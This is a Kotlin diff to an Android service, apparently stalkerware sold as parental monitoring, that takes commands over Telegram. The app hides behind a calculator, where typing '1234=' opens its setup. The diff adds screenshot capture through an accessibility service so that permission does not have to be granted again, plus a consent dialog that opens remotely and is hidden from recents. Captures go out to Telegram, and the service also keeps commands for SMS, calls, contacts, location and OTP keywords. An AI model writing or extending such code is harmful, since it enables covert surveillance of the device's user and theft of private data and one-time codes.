@@ -245,6 +245,7 @@ class MonitoringService : Service() {
         const val ACTION_LIVENESS_TEST = "LIVENESS_SELF_TEST"
         const val ACTION_REFRESH_FGS = "REFRESH_FGS"
         const val ACTION_ADMIN_ALERT = "ADMIN_ALERT_ATTEMPT"
+        const val ACTION_AFTER_SHOT_GRANT = "AFTER_SHOT_GRANT"
         private const val SELF_TEST_ALARM_DELAY_MS = 45_000L
         private const val HEX_DIGITS = "0123456789abcdef"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
@@ -254,7 +255,7 @@ class MonitoringService : Service() {
         private val OTP_KEYWORDS = arrayOf("otp", "kode", "verifikasi", "verification", "otentikasi", "aktivasi", "konfirmasi", "token", "password", "kata sandi")
         private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
-        private val MUTATING_COMMANDS = setOf("/tombol", "/angka", "/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/heartbeat", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput", "/sembuh", "/kendara", "/hematdata")
+        private val MUTATING_COMMANDS = setOf("/tombol", "/angka", "/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/heartbeat", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput", "/sembuh", "/kendara", "/hematdata", "/izinshot")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive", "/cekmati", "/layar")
         private val KNOWN_COMMANDS = setOf("/tombol", "/angka", "/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/cekmati", "/sembuh", "/layar", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput", "/kendara", "/hematdata")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput", "cekmati" to "/cekmati", "ujimati" to "/cekmati", "sembuh" to "/sembuh", "pulih" to "/sembuh", "layar" to "/layar", "screentime" to "/layar", "kendara" to "/kendara", "berkendara" to "/kendara", "kendaraan" to "/kendara", "hematdata" to "/hematdata", "hematkuota" to "/hematdata", "kuota" to "/hematdata", "tombol" to "/tombol", "angka" to "/tombol")
@@ -518,6 +519,16 @@ class MonitoringService : Service() {
                 }
                 if (isRunning) {
                     serviceScope.launch { handleAdminAlert() }
+                }
+                return START_STICKY
+            }
+            ACTION_AFTER_SHOT_GRANT -> {
+                if (!isRunning && shouldAutoResume()) {
+                    startMonitoring()
+                }
+                if (isRunning) {
+                    serviceScope.launch { sendToTelegram("\u2705 Izin tangkap layar diterima \u2014 mengambil layar\u2026") }
+                    captureAndSendScreenshot()
                 }
                 return START_STICKY
             }
@@ -1968,6 +1979,7 @@ class MonitoringService : Service() {
                 }
             }
             "/status" -> handleStatusCommand()
+            "/izinshot" -> requestShotGrant()
             "/perms" -> {
                 val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
                 sendToTelegram(permInventoryText(permissionRawStates(), notifOn))
@@ -5801,12 +5813,50 @@ class MonitoringService : Service() {
         return (appliedFgsTypes and ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION) != 0
     }
 
+    private fun shotViaAccessibility(): Boolean {
+        return try { com.redeye.parentalmonitor.service.ShotAccessibilityService.ready() } catch (_: Exception) { false }
+    }
+
     private fun screenshotFailureHint(): String {
+        if (shotViaAccessibility()) {
+            return "Jalur Aksesibilitas aktif tapi pengambilan gagal \u2014 coba /screenshot lagi; bila terus gagal, buka Setup lalu matikan-nyalakan lagi layanan Aksesibilitasnya."
+        }
         val types = fgsTypesText(appliedFgsTypes)
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !screenshotTypeActive()) {
             "Tipe latar 'screen' belum aktif (kini: $types). Buka aplikasi sekali agar layanan memulihkan tipe latar di depan, lalu kirim /screenshot lagi. Bila tetap gagal, berikan izinnya sekali lagi: Setup → Capture Screen."
         } else {
             "Tipe latar 'screen' aktif ($types), jadi izinnya kemungkinan sudah tak berlaku (Android mengizinkan satu sesi per izin). Berikan sekali lagi: buka Setup → Capture Screen."
+        }
+    }
+
+    private fun shotGrantMarkup(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
+        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
+            listOf(
+                listOf(com.redeye.parentalmonitor.network.InlineButton("\uD83D\uDDA5\uFE0F Beri izin sekali", "x:izinshot"))
+            )
+        )
+    }
+
+    private fun requestShotGrant() {
+        if (!com.redeye.parentalmonitor.utils.AutoStart.canDrawOverlays(this)) {
+            serviceScope.launch {
+                sendToTelegram("⚠️ Butuh izin <b>Tampil di atas aplikasi lain</b> agar dialog izin bisa dibuka dari Telegram. Buka Setup \u2192 aktifkan izin itu, lalu kirim /screenshot lagi.")
+            }
+            return
+        }
+        try {
+            startActivity(
+                android.content.Intent(this, com.redeye.parentalmonitor.ui.ShotConsentActivity::class.java)
+                    .addFlags(
+                        android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                            android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                            android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
+                    )
+            )
+        } catch (_: Exception) {
+            serviceScope.launch {
+                sendToTelegram("⚠️ Gagal membuka dialog izin. Buka aplikasi kalkulator \u2192 1234= \u2192 Setup \u2192 Capture Screen.")
+            }
         }
     }
 
@@ -5823,12 +5873,15 @@ class MonitoringService : Service() {
             }
             return
         }
-        if (!hasScreenshotConsent()) {
+        if (!hasScreenshotConsent() && !shotViaAccessibility()) {
             val ended = try { com.redeye.parentalmonitor.utils.ScreenCapture.sessionEnded() } catch (_: Exception) { false }
             serviceScope.launch {
                 sendToTelegram(
-                    if (ended) "⚠️ Sesi izin tangkap layar sudah berakhir — Android hanya mengizinkan satu sesi per izin, dan sesinya ditutup saat layanan monitoring berhenti. Berikan sekali lagi: buka Setup, tekan Capture Screen."
-                    else "⚠️ Izin tangkap layar belum diberikan. Buka Setup, tekan Capture Screen, lalu izinkan sekali."
+                    (if (ended) "⚠️ Sesi izin tangkap layar sudah berakhir (Android hanya mengizinkan satu sesi per izin, dan sesinya ditutup saat layanan monitoring berhenti)."
+                    else "⚠️ Izin tangkap layar belum diberikan.") +
+                        " Tekan <b>Beri izin sekali</b> di bawah \u2014 dialog izin terbuka lalu layar langsung diambil." +
+                        "\n\nSupaya tak perlu izin lagi walau HP restart: Setup \u2192 <b>Aktifkan Aksesibilitas</b>.",
+                    shotGrantMarkup()
                 )
             }
             return
@@ -6052,7 +6105,42 @@ class MonitoringService : Service() {
         return try { com.redeye.parentalmonitor.utils.ScreenCapture.current() } catch (_: Exception) { null }
     }
 
+    private fun writeScreenshotJpeg(bmp: Bitmap): File? {
+        val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
+        return try {
+            java.io.FileOutputStream(out).use { bmp.compress(Bitmap.CompressFormat.JPEG, 85, it) }
+            if (!out.exists() || out.length() == 0L) {
+                deleteQuietly(out)
+                null
+            } else {
+                out
+            }
+        } catch (_: Exception) {
+            deleteQuietly(out)
+            null
+        } finally {
+            try { bmp.recycle() } catch (_: Exception) { }
+        }
+    }
+
+    private suspend fun takeScreenshotFrameViaAccessibility(): File? {
+        if (!shotViaAccessibility()) return null
+        val result = kotlinx.coroutines.CompletableDeferred<Bitmap?>()
+        try {
+            com.redeye.parentalmonitor.service.ShotAccessibilityService.capture { shot -> result.complete(shot) }
+        } catch (_: Exception) {
+            result.complete(null)
+        }
+        val bmp = try {
+            kotlinx.coroutines.withTimeoutOrNull(20_000L) { result.await() }
+        } catch (_: Exception) {
+            null
+        } ?: return null
+        return writeScreenshotJpeg(bmp)
+    }
+
     private suspend fun takeScreenshotFrame(): File? {
+        takeScreenshotFrameViaAccessibility()?.let { return it }
         if (!hasScreenshotConsent()) {
             releaseShotSession()
             return null
@@ -6100,17 +6188,7 @@ class MonitoringService : Service() {
                 try { bmp.recycle() } catch (_: Exception) { }
                 return null
             }
-            val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
-            try {
-                java.io.FileOutputStream(out).use { bmp.compress(Bitmap.CompressFormat.JPEG, 85, it) }
-            } catch (_: Exception) {
-                deleteQuietly(out)
-                return null
-            } finally {
-                try { bmp.recycle() } catch (_: Exception) { }
-            }
-            if (!out.exists() || out.length() == 0L) { deleteQuietly(out); return null }
-            return out
+            return writeScreenshotJpeg(bmp)
         } finally {
             try { img.close() } catch (_: Exception) { }
         }
